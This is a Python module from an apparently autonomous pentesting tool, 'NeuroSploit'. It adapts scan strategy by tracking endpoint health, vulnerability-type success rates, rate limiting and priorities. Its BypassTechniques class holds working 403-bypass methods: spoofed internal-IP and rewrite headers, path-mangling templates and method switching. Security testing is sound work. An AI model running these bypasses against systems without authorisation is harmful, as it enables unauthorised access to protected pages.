"""
NeuroSploit v3 - Strategy Adapter

Mid-scan strategy adaptation: signal tracking, 403 bypass attempts,
diminishing returns detection, endpoint health monitoring, and
dynamic reprioritization for autonomous pentesting.
"""

import asyncio
import logging
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Callable
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


@dataclass
class EndpointHealth:
    """Health tracking for a single endpoint."""
    url: str
    total_tests: int = 0
    consecutive_failures: int = 0
    status_403_count: int = 0
    status_429_count: int = 0
    timeout_count: int = 0
    findings_count: int = 0
    is_dead: bool = False
    waf_detected: bool = False
    avg_response_time: float = 0.0
    _response_times: list = field(default_factory=list)
    tested_types: set = field(default_factory=set)
    last_test_time: float = 0.0


@dataclass
class VulnTypeStats:
    """Tracking stats per vulnerability type."""
    vuln_type: str
    total_tests: int = 0
    confirmed_count: int = 0
    rejected_count: int = 0
    waf_block_count: int = 0
    success_rate: float = 0.0
    avg_confidence: float = 0.0
    _confidences: list = field(default_factory=list)


class BypassTechniques:
    """403 Forbidden bypass with 15+ techniques."""

    HEADER_BYPASSES = [
        {"X-Original-URL": "{path}"},
        {"X-Rewrite-URL": "{path}"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "localhost"},
    ]

    PATH_BYPASSES = [
        "{path}/.",           # /admin/.
        "{path}/./",          # /admin/./
        "{path}..;/",         # /admin..;/
        "/{path}//",          # //admin//
        "{path}%20",          # /admin%20
        "{path}%00",          # /admin%00 (null byte)
        "{path}?",            # /admin?
        "{path}???",          # /admin???
        "{path}#",            # /admin#
        "/%2e/{path_no_slash}",    # /%2e/admin
        "/{path_no_slash};/",      # /admin;/
        "/{path_no_slash}..;/",    # /admin..;/
        "/{path_upper}",           # /ADMIN
    ]

    METHOD_BYPASSES = ["OPTIONS", "PUT", "PATCH", "TRACE", "HEAD"]

    @classmethod
    async def attempt_bypass(
        cls,
        request_engine,
        url: str,
        original_method: str = "GET",
        original_response: Optional[Dict] = None,
    ) -> Optional[Dict]:
        """Try bypass techniques on a 403'd URL.
        
        Returns the first successful bypass response, or None.
        """
        parsed = urlparse(url)
        path = parsed.path
        path_no_slash = path.lstrip("/")
        path_upper = path.upper()
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Phase 1: Header bypasses
        for header_set in cls.HEADER_BYPASSES:
            try:
                headers = {}
                for k, v in header_set.items():
                    headers[k] = v.format(path=path)
                
                result = await request_engine.request(
                    url, method=original_method, headers=headers
                )
                if result and result.status not in (403, 401, 0):
                    logger.info(f"403 bypass via header {list(header_set.keys())[0]}: {url}")
                    return {
                        "status": result.status,
                        "body": result.body,
                        "headers": result.headers,
                        "bypass_method": f"header:{list(header_set.keys())[0]}",
                    }
            except Exception:
                continue

        # Phase 2: Path bypasses
        for path_tmpl in cls.PATH_BYPASSES:
            try:
                new_path = path_tmpl.format(
                    path=path, path_no_slash=path_no_slash, path_upper=path_upper
                )
                bypass_url = f"{base_url}{new_path}"
                if parsed.query:
                    bypass_url += f"?{parsed.query}"
                
                result = await request_engine.request(
                    bypass_url, method=original_method
                )
                if result and result.status not in (403, 401, 404, 0):
                    logger.info(f"403 bypass via path '{new_path}': {url}")
                    return {
                        "status": result.status,
                        "body": result.body,
                        "headers": result.headers,
                        "bypass_method": f"path:{new_path}",
                    }
            except Exception:
                continue

        # Phase 3: Method bypasses
        for method in cls.METHOD_BYPASSES:
            if method == original_method:
                continue
            try:
                result = await request_engine.request(url, method=method)
                if result and result.status not in (403, 401, 405, 0):
                    logger.info(f"403 bypass via method {method}: {url}")
                    return {
                        "status": result.status,
                        "body": result.body,
                        "headers": result.headers,
                        "bypass_method": f"method:{method}",
                    }
            except Exception:
                continue

        return None


class StrategyAdapter:
    """Mid-scan strategy adaptation engine.
    
    Monitors endpoint health, vuln type success rates, and global signals
    to dynamically adjust testing strategy.
    
    Features:
    - Dead endpoint detection (skip after N consecutive failures)
    - Hot endpoint promotion (more testing on productive endpoints)
    - 403 bypass (15+ techniques via BypassTechniques)
    - Diminishing returns (stop testing unproductive type+endpoint combos)
    - Dynamic rate limiting adjustment
    - Priority recomputation every N tests
    - Global statistics and reporting
    """

    DEAD_ENDPOINT_THRESHOLD = 3        # Consecutive failures before marking dead
    DIMINISHING_RETURNS_THRESHOLD = 10 # Max failed payloads before skipping type
    ADAPTATION_INTERVAL = 50           # Tests between priority recomputations
    MAX_403_BYPASS_PER_URL = 2         # Max bypass attempts per URL
    HOT_ENDPOINT_THRESHOLD = 2         # Findings to mark endpoint as "hot"

    def __init__(self, memory=None):
        self.memory = memory
        self._endpoints: Dict[str, EndpointHealth] = {}
        self._vuln_stats: Dict[str, VulnTypeStats] = {}
        self._global_test_count = 0
        self._global_finding_count = 0
        self._last_adaptation_time = time.time()
        self._last_adaptation_count = 0
        self._403_bypass_attempts: Dict[str, int] = {}  # url -> attempt count
        self._bypass_successes: List[Dict] = []
        self._hot_endpoints: set = set()
        self._rate_limit_detected = False
        self._global_delay = 0.1

    def _get_endpoint(self, url: str) -> EndpointHealth:
        """Get or create endpoint health tracker."""
        # Normalize URL (strip query params for grouping)
        parsed = urlparse(url)
        key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if key not in self._endpoints:
            self._endpoints[key] = EndpointHealth(url=key)
        return self._endpoints[key]

    def _get_vuln_stats(self, vuln_type: str) -> VulnTypeStats:
        """Get or create vuln type stats tracker."""
        if vuln_type not in self._vuln_stats:
            self._vuln_stats[vuln_type] = VulnTypeStats(vuln_type=vuln_type)
        return self._vuln_stats[vuln_type]

    def record_test_result(
        self,
        url: str,
        vuln_type: str,
        status: int,
        was_confirmed: bool,
        confidence: int = 0,
        duration: float = 0.0,
        error_type: str = "success",
    ):
        """Record the result of a vulnerability test.
        
        Called after each test attempt to update all tracking state.
        """
        ep = self._get_endpoint(url)
        vs = self._get_vuln_stats(vuln_type)
        self._global_test_count += 1

        # Update endpoint health
        ep.total_tests += 1
        ep.last_test_time = time.time()
        ep.tested_types.add(vuln_type)

        if duration > 0:
            ep._response_times.append(duration)
            if len(ep._response_times) > 30:
                ep._response_times = ep._response_times[-20:]
            ep.avg_response_time = sum(ep._response_times) / len(ep._response_times)

        if status == 403:
            ep.status_403_count += 1
        elif status == 429:
            ep.status_429_count += 1
            self._rate_limit_detected = True
        elif error_type in ("timeout", "connection_error"):
            ep.timeout_count += 1

        # Track consecutive failures
        if was_confirmed:
            ep.consecutive_failures = 0
            ep.findings_count += 1
            self._global_finding_count += 1
            if ep.findings_count >= self.HOT_ENDPOINT_THRESHOLD:
                self._hot_endpoints.add(ep.url)
        elif status in (0, 403, 429) or error_type != "success":
            ep.consecutive_failures += 1
            if ep.consecutive_failures >= self.DEAD_ENDPOINT_THRESHOLD:
                ep.is_dead = True
                logger.debug(f"Endpoint marked dead: {ep.url}")
        else:
            # Got a response but no finding -- not a consecutive failure
            ep.consecutive_failures = 0

        # Update vuln type stats
        vs.total_tests += 1
        if was_confirmed:
            vs.confirmed_count += 1
        else:
            vs.rejected_count += 1
        if status == 403 and error_type == "waf_blocked":
            vs.waf_block_count += 1
        if confidence > 0:
            vs._confidences.append(confidence)
            if len(vs._confidences) > 50:
                vs._confidences = vs._confidences[-30:]
            vs.avg_confidence = sum(vs._confidences) / len(vs._confidences)
        vs.success_rate = vs.confirmed_count / vs.total_tests if vs.total_tests > 0 else 0

    def should_test_endpoint(self, url: str) -> bool:
        """Check if an endpoint should still be tested."""
        ep = self._get_endpoint(url)
        if ep.is_dead:
            return False
        return True

    def should_test_type(self, vuln_type: str, url: str) -> bool:
        """Check if a vuln type should be tested on an endpoint."""
        ep = self._get_endpoint(url)
        vs = self._get_vuln_stats(vuln_type)

        # Skip if endpoint is dead
        if ep.is_dead:
            return False

        # Skip if this type has 0% success after 15+ global tests AND waf blocks
        if vs.total_tests >= 15 and vs.success_rate == 0 and vs.waf_block_count > 5:
            logger.debug(f"Skipping {vuln_type}: 0% success + WAF blocks")
            return False

        return True

    def should_reduce_payloads(self, vuln_type: str, tested_count: int) -> bool:
        """Check if we should stop testing payloads (diminishing returns)."""
        vs = self._get_vuln_stats(vuln_type)

        # Allow more payloads for types with good success rate
        if vs.success_rate > 0.1:
            return tested_count >= self.DIMINISHING_RETURNS_THRESHOLD * 2

        return tested_count >= self.DIMINISHING_RETURNS_THRESHOLD

    def should_attempt_403_bypass(self, url: str) -> bool:
        """Check if we should try 403 bypass for this URL."""
        ep = self._get_endpoint(url)
        attempts = self._403_bypass_attempts.get(ep.url, 0)
        return (
            ep.status_403_count >= 2
            and attempts < self.MAX_403_BYPASS_PER_URL
        )

    async def try_bypass_403(self, request_engine, url: str, method: str = "GET") -> Optional[Dict]:
        """Attempt 403 bypass with multiple techniques."""
        ep = self._get_endpoint(url)
        self._403_bypass_attempts[ep.url] = self._403_bypass_attempts.get(ep.url, 0) + 1

        result = await BypassTechniques.attempt_bypass(
            request_engine, url, original_method=method
        )

        if result:
            self._bypass_successes.append({
                "url": url,
                "method": result.get("bypass_method", "unknown"),
                "status": result.get("status", 0),
            })
            # Revive endpoint
            ep.is_dead = False
            ep.consecutive_failures = 0
            logger.info(f"403 bypass success: {url} via {result.get('bypass_method')}")

        return result

    def get_dynamic_delay(self) -> float:
        """Get current recommended delay between requests."""
        if self._rate_limit_detected:
            return max(self._global_delay, 1.0)
        return self._global_delay

    def should_recompute_priorities(self) -> bool:
        """Check if it's time to recompute testing priorities."""
        tests_since = self._global_test_count - self._last_adaptation_count
        time_since = time.time() - self._last_adaptation_time
        return tests_since >= self.ADAPTATION_INTERVAL or time_since >= 120

    def recompute_priorities(self, vuln_types: List[str]) -> List[str]:
        """Recompute vuln type priority order based on observed results.
        
        Promotes types with high success rates and deprioritizes failed types.
        Returns reordered list of vuln types.
        """
        self._last_adaptation_count = self._global_test_count
        self._last_adaptation_time = time.time()

        def type_score(vt):
            vs = self._get_vuln_stats(vt)
            if vs.total_tests == 0:
                return 0.5  # Untested -- medium priority
            # Weighted: success rate + bonus for confirmed findings
            score = vs.success_rate * 0.6
            if vs.confirmed_count > 0:
                score += 0.3
            # Penalty for WAF blocks
            if vs.waf_block_count > vs.total_tests * 0.5:
                score -= 0.2
            return score

        scored = [(vt, type_score(vt)) for vt in vuln_types]
        scored.sort(key=lambda x: x[1], reverse=True)

        reordered = [vt for vt, _ in scored]
        logger.debug(f"Priority recomputed: {reordered[:5]}")
        return reordered

    def get_hot_endpoints(self) -> List[str]:
        """Get endpoints that have yielded multiple findings."""
        return list(self._hot_endpoints)

    def get_report_context(self) -> Dict:
        """Get strategy stats for report generation."""
        dead_count = sum(1 for e in self._endpoints.values() if e.is_dead)
        hot_count = len(self._hot_endpoints)

        top_types = sorted(
            self._vuln_stats.values(),
            key=lambda v: v.confirmed_count,
            reverse=True,
        )[:5]

        return {
            "total_tests": self._global_test_count,
            "total_findings": self._global_finding_count,
            "endpoints_tested": len(self._endpoints),
            "endpoints_dead": dead_count,
            "endpoints_hot": hot_count,
            "rate_limiting_detected": self._rate_limit_detected,
            "bypass_successes": len(self._bypass_successes),
            "bypass_details": self._bypass_successes[:10],
            "top_vuln_types": [
                {
                    "type": v.vuln_type,
                    "tests": v.total_tests,
                    "confirmed": v.confirmed_count,
                    "rate": f"{v.success_rate:.1%}",
                }
                for v in top_types
            ],
            "hot_endpoints": list(self._hot_endpoints)[:10],
        }

    def get_endpoint_summary(self) -> Dict[str, Dict]:
        """Get summary of all tracked endpoints."""
        return {
            url: {
                "tests": ep.total_tests,
                "findings": ep.findings_count,
                "dead": ep.is_dead,
                "403s": ep.status_403_count,
                "avg_response": round(ep.avg_response_time, 3),
            }
            for url, ep in self._endpoints.items()
        }
